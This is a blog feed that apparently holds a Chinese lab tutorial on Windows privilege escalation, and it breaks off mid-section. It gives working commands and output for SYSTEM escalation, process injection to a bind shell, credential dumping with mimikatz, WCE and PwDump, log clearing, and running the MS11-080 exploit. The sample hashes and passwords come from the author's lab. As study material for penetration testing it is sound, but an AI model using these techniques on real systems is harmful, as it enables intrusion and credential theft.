<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透测试——被动信息收集</title>
      <link href="/2020/04/03/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji-1/"/>
      <url>/2020/04/03/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——提权</title>
      <link href="/2020/04/03/shen-tou-ce-shi-ti-quan/"/>
      <url>/2020/04/03/shen-tou-ce-shi-ti-quan/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试——提权部分知识"><a href="#渗透测试——提权部分知识" class="headerlink" title="渗透测试——提权部分知识"></a>渗透测试——提权部分知识</h2><p>[TOC]</p><h3 id="提权——本地提权"><a href="#提权——本地提权" class="headerlink" title="提权——本地提权"></a>提权——本地提权</h3><ul><li>已实现本地低权限账号登录<ul><li>远程溢出</li><li>直接获得账号密码</li></ul></li><li>希望获得更高权限<ul><li>实现对目标进一步控制</li></ul></li><li>系统账号之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登录时获取权限令牌</li><li>服务账号无需用户登录已在后台启动服务</li></ul></li><li>Windows<ul><li>users</li><li>Administrator</li><li>System</li></ul></li><li>Linux<ul><li>User</li><li>Root</li></ul></li></ul><h4 id="1-Windows系统提权"><a href="#1-Windows系统提权" class="headerlink" title="1.Windows系统提权"></a>1.Windows系统提权</h4><h5 id="1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）"><a href="#1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）" class="headerlink" title="1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）"></a>1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）</h5><pre><code> # 修改密码：net user kevin * C:\Documents and Settings\kevin&gt;net user kevin *     Type a password for the user:     Retype the password to confirm:     The command completed successfully. # 查看系统用户：net user C:\Documents and Settings\kevin&gt;net user     User accounts for \\DH-CA8822AB9589     ---------------------------------------------------------------------     Administrator            Guest                    HelpAssistant     IUSR_DH-CA8822AB9589     IWAM_DH-CA8822AB9589     kevin     SUPPORT_388945a0     The command completed successfully. # 查看用户状态： C:\Documents and Settings\kevin&gt;net user kevin     User name                    kevin     Full Name                    kevin     Comment     User&#39;s comment     Country code                 000 (System Default)     Account active               Yes     Account expires              Never     Password last set            2/28/2018 2:05 PM     Password expires             Never     Password changeable          2/28/2018 2:05 PM     Password required            Yes     User may change password     Yes     Workstations allowed         All     Logon script     User profile     Home directory     Last logon                   2/28/2018 2:03 PM     Logon hours allowed          All     Local Group Memberships      *Administrators       *Users     Global Group memberships     *None     The command completed successfully.</code></pre><p>1.查看用户进程</p><p> <img src="https://img-blog.csdn.net/20180228141004062?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><p>2.将 kevin 用户权限提升为 system 权限</p><pre><code>  C:\Documents and Settings\kevin&gt;cd \  C:\&gt;at -?  C:\&gt;at 2:15 /interactive cmd  #必须是未来时间，否则将是明天时间      Added a new job with job ID = 1  C:\&gt;at  Status ID   Day                     Time          Command Line  ---------------------------------------------------------------------          1   Today                     2:15 AM       cmd</code></pre><p><img src="https://img-blog.csdn.net/20180228142729494?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><p>3.用新的 system 权限的窗口启动任务管理器</p><pre><code>  C:\WINDOWS\system32&gt;taskmgr</code></pre><p>4.关闭explorer</p><p><img src="https://img-blog.csdnimg.cn/2019041316500887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>5.应用程序-&gt;新任务-&gt;explorer</p><p><img src="https://img-blog.csdnimg.cn/20190413165013914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>6.验证桌面用户权限</p><p><img src="https://img-blog.csdnimg.cn/20190413165019827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本"><a href="#2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本" class="headerlink" title="2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)"></a>2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)</h5><p>1.运行-&gt;services.msc</p><p><img src="https://img-blog.csdnimg.cn/2019041316502652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>C:\Documents and Settings\kevin&gt;cd</li><li>C:&gt;sc Create syscmd binPath= “cmd /K start” type= own type= interact</li><li>C:&gt;sc start syscmd</li></ul><p>3.使用 Sysinternals Suite 套件</p><p>推荐书籍 《Windows Internals第7版》</p><p><a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener">Sysinternals Suite 套件下载</a></p><ul><li><p>下载之后解压使用其中的 PsExec 放在C盘根目录</p><p><img src="https://img-blog.csdnimg.cn/20190413165034700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>启动 PsExec.exe</p></li></ul><pre><code>  C:\&gt;PsExec.exe  -i: 交互模式  -s: 使用系统账户  C:\&gt;psexec -p&#39;sei -s -d taskmgr  C:\&gt;PsExec.exe -i -s cmd</code></pre><ul><li>提权结果</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165041110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2-注入进程提权"><a href="#2-注入进程提权" class="headerlink" title="2.注入进程提权"></a>2.注入进程提权</h4><ul><li>pinjector.exe</li></ul><p>下载：<a href="https://www.tarasco.org/security/Process_Injector/：" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/：</a></p><ul><li>下载之后解压使用其中的 PsExec 放在C盘根目录</li></ul><p><img src="https://img-blog.csdn.net/20180228204907249?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><ul><li>列出可注入进程及其信息<ul><li>C:&gt;pinjector.exe</li><li>C:&gt;pinjector.exe -l</li></ul></li><li>找一个未使用端口<ul><li>C:&gt;netstat -nao | find “555” </li><li>无结果表示未使用</li></ul></li><li>选择一个进程注入</li></ul><pre><code>  C:\&gt;pinjector.exe -l      PID    668 services.exe ( 16 Threads)  USER: \\NT AUTHORITY\SYSTEM  C:\&gt;pinjector.exe -p 668 cmd 555      Privilege Switcher for Win32(Private version)      (c) 2006 Andres Tarasco - atarasco@gmail.com      [+] Trying to execute cmd to 668 as: ? \      [+] Code inyected... ; )</code></pre><ul><li>查看被注入的进程的监听状态</li></ul><pre><code>  C:\&gt;netstat -nao | find &quot;555&quot;      TCP    0.0.0.0:555            0.0.0.0:0              LISTENING       668</code></pre><ul><li>查看被注入的进程的监听状态</li></ul><pre><code>  C:\&gt;netstat -nao | find &quot;555&quot;      TCP    0.0.0.0:555            0.0.0.0:0              LISTENING       668</code></pre><ul><li>利用此监听端口</li></ul><pre><code>  root@kali：~# nc -nv 10.10.10.128 555      Connection to 10.10.10.128 555 port [tcp/*] succeeded!      Microsoft Windows XP [?汾 5.1.2600]      (C) ??????? 1985-2001 Microsoft Corp  C:\WINDOWS\system32&gt;whoami      whoami      SYSTEM</code></pre><ul><li>查看进程</li></ul><pre><code>  使用 SysinternalsSuite/procexp.exe 查看进程</code></pre><p><img src="https://img-blog.csdn.net/20180228204920586?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="3-读取windows本地密码"><a href="#3-读取windows本地密码" class="headerlink" title="3.读取windows本地密码"></a>3.读取windows本地密码</h4><h5 id="1-抓包嗅探"><a href="#1-抓包嗅探" class="headerlink" title="1. 抓包嗅探"></a>1. 抓包嗅探</h5><ol><li>Windows<ul><li>Wireshark</li><li>Omnipeek</li><li>Commview</li><li>Sniffpass：抓取密码相关的数据包</li></ul></li><li>Linux<ul><li>Tcpdump</li><li>Wireshark</li><li>Dsniff：抓取密码相关的数据包</li></ul></li></ol><h5 id="2-键盘记录本地密码"><a href="#2-键盘记录本地密码" class="headerlink" title="2. 键盘记录本地密码"></a>2. 键盘记录本地密码</h5><ul><li>可以使用木马软件 DarkCometRAT</li><li>在控制目标主机之后可以监控键盘记录信息</li></ul><h5 id="3-查看本地缓存密码"><a href="#3-查看本地缓存密码" class="headerlink" title="3.查看本地缓存密码"></a>3.查看本地缓存密码</h5><ul><li>在浏览器查看缓存密码</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165110693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>windows 密码恢复工具</p><ul><li><a href="http://www.nirsoft.net/password_recovery_tools.html" target="_blank" rel="noopener">Windows Password Recovery Tools</a></li></ul></li><li><p>使用 Pwdump 查看 windows 本地登录密码</p><ul><li>windows 登录密码保存在 C:\Windows\System32\config\SAM 文件中</li><li>pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li><li>添加用户</li></ul><pre><code>  C:\Documents and Settings\kevin&gt;net user user2 123456 /add  C:\Documents and Settings\kevin&gt;net user      \\ICST-WINATT 的用户帐户      -------------------------------------------------------------      Administrator            Guest                    HelpAssistant      kevin                    SUPPORT_388945a0         test      user1                    user2  C:\Documents and Settings\kevin&gt;cd \  C:\&gt;PwDump.exe localhost      Administrator:500:18D583B495C4696AFF17365FAF1FFE89:5D36F0CA14EEBEF32F55C7B6A4675DB0:::      Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::      HelpAssistant:1000:5906F3A72959D5902440275BA555A537:10AA20D63C3EC71E0102AC95ADF6DF73:::      kevin:1004:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::      SUPPORT_388945a0:1002:NO PASSWORD*********************:8AFA81401E8D8EBFA42B4E46F6507C07:::      test:1005:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::      user1:1006:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::      user2:1007:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::Completed.  # 结果：前部分是 LMHASH ，后部分是 NTLMHASH</code></pre><ul><li><p>可以将结果保存在文件中，然后在 kali 中进行破解</p><p><img src="https://img-blog.csdnimg.cn/20190413165117218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul></li></ul><h4 id="WCE-WINDOWS-CREDENTIAL-EDITOR"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h4><ul><li>WINDOWS身份认证过程</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165135348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="WCE-WINDOWS-CREDENTIAL-EDITOR-1"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR-1" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h5><ul><li>windows 内核中保存有密码明文副本，安全机制较低</li><li>需要管理员权限</li><li>工具保持在 kali 的 /usr/share/wce/wce-universal # 通用格式是自动识别32位和64位</li><li>多用户登录目标主机</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165139664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>列举登录账号及会话</li></ul><pre><code>  C:\&gt;wce-universal.exe -lv      0020B19D:user1:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0      # 与 C:\&gt;PwDump.exe localhost 结果相同</code></pre><ul><li><p>每隔5秒刷新一次</p><ul><li>wce-universal.exe -r</li></ul></li><li><p>删除登录会话</p><pre><code>  C:\&gt;wce-universal.exe -d 0020B19D  C:\&gt;wce-universal.exe -lv      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></pre></li><li><p>计算密码对应的 HASH 值</p></li></ul><pre><code>  C:\&gt;wce-universal.exe -g passwd      Password:   passwd      Hashes:     91C7AE7122196B5EAAD3B435B51404EE:22315D6ED1A7D5F8A7C98C40E9FA2DEC</code></pre><ul><li>读取内核中的明文密码</li></ul><pre><code>  C:\&gt;wce-universal.exe -w      user1\ICST-WINATT:123456      user2\ICST-WINATT:123456      test\ICST-WINATT:123456      kevin\ICST-WINATT:123456      NETWORK SERVICE\MSHOME:  C:\&gt;net user user1 111222      命令成功完成。  C:\&gt;wce-universal.exe -w      user1\ICST-WINATT:123456      user2\ICST-WINATT:123456      test\ICST-WINATT:123456      kevin\ICST-WINATT:123456      NETWORK SERVICE\MSHOME:  # 当前内核中保存的值会在下次登录被读取出来</code></pre><ul><li>对 LUID 进行修改（将LUID改为匹配其他用户的用户名和密码）</li></ul><pre><code>  C:\&gt;wce-universal.exe -lv      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0  C:\&gt;wce-universal.exe -i 001E5D92 -s kevin:ICST-    WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      Changing NTLM credentials of logon session 001E5D92h to:      Username: kevin      domain: ICST-WINATT      LMHash: 44EFCE164AB921CAAAD3B435B51404EE      NTHash: 32ED87BDB5FDC5E9CBA88547376818D4      NTLM credentials successfully changed!  C:\&gt;wce-universal.exe -lv      001E5D92:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></pre><ul><li><p>Win7 及 之前默认 都可遭受 WCE 攻击</p><ul><li>防范方法：修改注册表</li></ul><pre><code>  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></pre><ul><li>删除 wdigest 之后重启计算机</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165146599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><h5 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h5><ul><li>PwDump localhost<ul><li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li></ul></li><li>fgdump<ul><li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/<br>放在 WinXP 中， 双击或在命令行执行 fgdump.exe 会自动生成三个文件，文件中保存着密码</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165151759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><ul><li>在 kali 中的路径 /usr/share/mimikatz，将 win32 复制到 windows 主机</li></ul><pre><code>  C:\Win32&gt;mimikatz.exe  查看帮助是：：  mimikatz # ::              standard  -  Standard module  [Basic commands (does not require module name)]                crypto  -  Crypto Module              sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]              kerberos  -  Kerberos package module  []             privilege  -  Privilege module               process  -  Process module               service  -  Service module               lsadump  -  LsaDump module                    ts  -  Terminal Server module                 event  -  Event module                  misc  -  Miscellaneous module                 token  -  Token manipulation module                 vault  -  Windows Vault/Credential module           minesweeper  -  MineSweeper module                   net  -                 dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]             busylight  -  BusyLight Module                sysenv  -  System Environment Value module                   sid  -  Security Identifiers module                   iis  -  IIS XML Config module                   rpc  -  RPC control of mimikatz              mimikatz # privilege::              Module :        privilege              Full name :     Privilege module                 debug  -  Ask debug privilege            * *                driver  -  Ask load driver privilege              security  -  Ask security privilege                   tcb  -  Ask tcb privilege                backup  -  Ask backup privilege               restore  -  Ask restore privilege                sysenv  -  Ask system environment privilege                    id  -  Ask a privilege by its id                  name  -  Ask a privilege by its name  mimikatz # privilege::debug  mimikatz # sekurlsa::  mimikatz # sekurlsa::logonPasswords  mimikatz # sekurlsa::wdigest  mimikatz # process::list  mimikatz # lsadump::sam  mimikatz # lsadump::cache  mimikatz # ts::multirdp  mimikatz # event::clear  mimikatz # event::drop  mimikatz # misc::regedit  mimikatz # token::whoami</code></pre><h3 id="提权——利用漏洞提权"><a href="#提权——利用漏洞提权" class="headerlink" title="提权——利用漏洞提权"></a>提权——利用漏洞提权</h3><h5 id="1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限"><a href="#1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限" class="headerlink" title="1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限"></a>1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限</h5><ul><li><p>Ms011-080 对应补丁 Kb2592799</p><p><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">微软官网公告(https://technet.microsoft.com/library/security/ms11-080)</a></p><p><img src="https://img-blog.csdnimg.cn/20190413165237322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><pre><code> root@kali:~# searchsploit Ms11-080     ------------------------------------------ --------------------------------      Exploit Title                            |  Path                                               | (/usr/share/exploitdb/)     ------------------------------------------ --------------------------------     Microsoft Windows - &#39;AfdJoinLeaf&#39; Local P | exploits/windows/local/21844.rb     Microsoft Windows XP/2003 - &#39;afd.sys&#39; Loc | exploits/windows/local/18176.py     ------------------------------------------ -------------------------------- root@kali:~# cp /usr/share/exploitdb/exploits/windows/local/18176.py . # 将文件拷贝到 英文版 WinXP 系统(有时候中文版 XP 也可以使用) # 首先查看 WinXP 是否安装了 对应更新 Kb2592799 WinXP -&gt; 运行 -&gt; appwiz.cpl -&gt; 查看是否有安装 Kb2592799，有的话卸载掉</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165247833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p> 查看 WinXP下的文件路径</p><p><img src="https://img-blog.csdnimg.cn/20190413165254957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.WinXP 上安装的 python 的运行环境<br>C:\Documents and Settings\kevin&gt;cd \</p><pre><code>  C:\&gt;18176.py -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165302568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  启动任务管理器</p><p><img src="https://img-blog.csdnimg.cn/20190413165311388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  结束 kevin 权限的 explorer 桌面程序</p><p><img src="https://img-blog.csdnimg.cn/20190413165317715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  输入 explorer</p><p><img src="https://img-blog.csdnimg.cn/2019041316532377.png" alt="在这里插入图片描述"></p><p>  启动 system 权限的 explorer 桌面程序</p><p><img src="https://img-blog.csdnimg.cn/20190413165333649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.WinXP 无需安装 Pyhon 的运行环境</p><pre><code>  # 使用 python2 的 pyinstaller 将 python 文件进行打包  root@kali:~# apt-get install python-pip  root@kali:~# pip install pyinstaller  # 或者 WinXP 下，安装 python2.7  C:\&gt;pyinstaller --onefile 18176.py      297 INFO: Building EXE from out00-EXE.toc      297 INFO: Appending archive to EXE C:\dist\18176.exe      328 INFO: Building EXE from out00-EXE.toc completed successfully.</code></pre><p><img src="https://img-blog.csdnimg.cn/2019041316534468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>  # 打开文件目录，将文件复制到目标主机  C:\&gt;whoami      test  C:\&gt;net user test      本地组成员             *Users      全局组成员             *None  # 查看文件位置</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165353673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>     C:\&gt;cd 111     C:\111&gt;18176.exe -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165402710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>     C:\WINDOWS\system32&gt;whoami         SYSTEM     # 将自己添加为管理员组     C:\WINDOWS\system32&gt;net localgroup administrators test /add         命令成功完成。</code></pre><p>2.用 Ms11-046 时目标主机蓝屏(Dos)</p><h5 id="2-Win7-使用-Ms14-068-获取-域控制器的权限"><a href="#2-Win7-使用-Ms14-068-获取-域控制器的权限" class="headerlink" title="2.Win7 使用 Ms14-068 获取 域控制器的权限"></a>2.Win7 使用 Ms14-068 获取 域控制器的权限</h5><ul><li><p>使用 win2003 搭建域控制器</p><ul><li><p>配置并连接域控制器</p><ul><li>运行 -&gt; dcpromo</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165412201.png" alt="在这里插入图片描述"></p></li></ul></li></ul><pre><code>     # Win2003 设置成域控制器，配置静态 IP 地址     # Win2003 设置强密码     C:\&gt;net user Administrator jlcssadmin2006...     # Win7 设置 静态 IP    并将 DNS 设置为 Win2003 的IP地址     # Win7 加入域控制器    </code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165420295.png" alt="在这里插入图片描述"></p><p>​    <img src="https://img-blog.csdnimg.cn/20190413165426948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190413165431859.png" alt="在这里插入图片描述"></p><p>重启之后</p><p><img src="https://img-blog.csdnimg.cn/20190413165438137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>修改 Win2003 中的域控制器的用户权限</p><ul><li>Win2003 -&gt; 运行 -&gt; dsa.msc</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165456477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165500666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>Win7</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165516801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>win2003</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165521164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>Win7 可以查看域控制器共享出来的文件等资源</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165527351.png" alt="在这里插入图片描述"></p><ul><li><p>使用漏洞代码攻击域控制器</p><ul><li><p>获取攻击文件</p><pre><code>  # root@kali:~# searchsploit Ms14-068      ------------------------------------------ ----------------------------------       Exploit Title                            |  Path                                | (/usr/share/                    exploitdb/)      ------------------------------------------ 